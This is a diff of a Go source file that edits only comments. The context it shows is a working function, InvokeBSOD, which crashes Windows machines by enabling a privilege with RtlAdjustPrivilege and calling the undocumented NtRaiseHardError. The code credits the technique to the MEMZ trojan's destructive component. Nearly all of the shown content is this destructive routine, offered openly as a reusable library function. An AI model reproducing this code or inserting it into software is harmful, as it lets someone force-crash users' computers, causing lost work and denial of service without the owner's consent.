@@ -29,14 +29,14 @@ var (
 
 /*
 InvokeBSOD attempts to induce a BSOD on a computers running Microsoft Windows using undocumented functions within the Windows API.
-The function shouldn't ever return an error, unless it failed in invoking a BSOD on the running system.
+The function shouldn't ever return an error, unless it failed in invoking a BSOD on the running system, or the system isn't running Microsoft Windows.
 */
 func InvokeBSOD() error {
 	// Check if computer is running Microsoft Windows
 	if runtime.GOOS == "windows" {
 		/*
 		 Try forcing BSOD using undocumentated functions from Windows API
-		 Credit to MEMZ: https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c#L10-L18
+		 Credit to Leurak: https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c#L10-L18
 		*/
 		RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&tempBool)))
 		NtRaiseHardError.Call(uintptr(NtErrorCode), 0, 0, 0, 6, uintptr(unsafe.Pointer(&tempString)))
